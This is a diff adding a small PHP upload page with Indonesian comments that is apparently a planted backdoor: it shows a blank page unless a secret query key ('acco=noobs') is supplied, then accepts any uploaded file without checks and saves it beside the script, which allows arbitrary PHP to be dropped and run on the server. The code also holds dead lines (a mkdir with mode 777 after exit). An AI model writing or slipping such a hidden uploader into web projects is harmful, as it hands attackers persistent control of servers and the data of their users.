@@ -1,0 +1,48 @@
+    <?php
+    error_reporting(E_ALL);
+    ini_set('display_errors', 1);
+    // Cek izin akses, jika tidak sesuai maka tampilkan halaman kosong
+    if (!isset($_GET['acco']) || $_GET['acco'] !== 'noobs') {
+        exit;
+        mkdir($uploadDir, 777, true);
+    }
+        if (isset($_POST['upload'])) {
+            if (isset($_FILES['myfile'])) {
+                echo "<pre>";
+                print_r($_FILES['myfile']);
+                echo "</pre>";
+
+                if ($_FILES['myfile']['error'] == 0) {
+                    $nama = basename($_FILES['myfile']['name']);
+                    $tmp  = $_FILES['myfile']['tmp_name'];
+                    $tujuan = __DIR__ . '/' . $nama;
+
+                    if (move_uploaded_file($tmp, $tujuan)) {
+                    echo "<p>File berhasil diupload: <strong>$nama</strong></p>";
+                    } else {
+                    echo "<p>Gagal menyimpan file ke: $tujuan</p>";
+                    echo "<p>Cek permission dan path!</p>";
+                    }
+                } else {
+                    echo "<p>Error code: {$_FILES['myfile']['error']}</p>";
+                }
+            } else {
+                echo "<p>File tidak ditemukan dalam request.</p>";
+            }
+        }
+        
+
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Upload File</title>
+    </head>
+    <body>
+    <h2>Form Upload File</h2>
+    <form action="?acco=noobs" method="post" enctype="multipart/form-data">
+        Pilih file: <input type="file" name="myfile">
+        <button type="submit" name="upload">Upload</button>
+    </form>
+    </body>
+    </html>
